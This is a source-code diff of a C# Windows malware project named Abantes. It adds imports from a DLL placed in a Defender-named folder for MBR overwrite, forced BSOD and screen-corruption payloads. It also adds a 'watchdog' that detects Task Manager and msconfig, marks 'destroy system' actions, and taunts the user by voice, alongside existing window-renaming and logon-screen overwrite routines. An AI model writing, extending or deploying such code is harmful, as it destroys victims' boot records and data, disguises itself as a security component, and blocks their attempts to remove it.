@@ -18,7 +18,12 @@ namespace Abantes.Payloads
 {
     class Threads
     {
-
+        public static void WathcDogThread()
+        {
+            WatchDog.Rules("Rules");
+            WatchDog.msconfig("msconfig");
+            WatchDog.TaskMGR("taskmgr");
+        }
     }
     class Anoying
     {
@@ -32,6 +37,10 @@ namespace Abantes.Payloads
                 SetWindowText(allProcesses[i].MainWindowHandle, "You're Screwed");
             }
         }
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Screw@Payloads@1@QAEXXZ")]
+        public static extern void Screen_Screw();
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Glitching@Payloads@1@QAEXXZ")]
+        public static extern void Screen_Glitching();
         static Point Position;
         static Random _random = new Random();
         public static void MouseTrap()
@@ -90,12 +99,10 @@ namespace Abantes.Payloads
     }
     class Destructive
     {
-        [DllImport("Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MBR_Overwrite@Payloads@1@QAEXXZ")]
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MBR_Overwrite@Payloads@1@QAEXXZ")]
         public static extern void MBR_Overwrite();
-        public static void MBROverwrite()
-        {
-            MBR_Overwrite();
-        }
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?FORCE_BSOD@Payloads@1@QAEXXZ")]
+        public static extern void FORCE_BSOD();
         public static void LogonUIOverwrite()
         {
             string TempPath = Path.GetTempPath();
@@ -152,8 +159,38 @@ namespace Abantes.Payloads
             catch { }
         }
     }
-    class WatchDogThreads
+    class WatchDog
     {
+        public static void Rules(string sProcessName)
+        {
+            Process[] proc = Process.GetProcessesByName(sProcessName);
+            if (proc.Length > 0)
+            {
 
+            }
+            else
+            {
+               //destroy system
+            }
+        }
+        public static void msconfig(string sProcessName)
+        {
+            Process[] proc = Process.GetProcessesByName(sProcessName);
+            if (proc.Length > 0)
+            {
+                //destroy System
+            }
+        }
+        public static void TaskMGR(string sProcessName)
+        {
+            Process[] proc = Process.GetProcessesByName(sProcessName);
+            if (proc.Length > 0)
+            {
+                SpeechSynthesizer TTS = new SpeechSynthesizer();
+                TTS.SetOutputToDefaultAudioDevice();
+                TTS.Volume = 100;
+                TTS.Speak("There Is No Way");
+            }
+        }
     }
 }
